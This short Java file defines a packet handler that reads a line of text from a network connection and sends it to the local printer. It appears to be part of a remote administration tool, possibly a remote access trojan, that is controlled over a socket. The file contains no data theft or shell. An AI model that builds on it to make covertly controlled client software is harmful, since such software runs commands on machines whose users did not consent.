package com.redpois0n.packets.in;

import javax.swing.JTextPane;

import com.redpois0n.Connection;


public class PacketPRINTER extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String toprint = Connection.readLine();
		JTextPane c = new JTextPane();
		c.setText(toprint);
		c.print();
	}

}
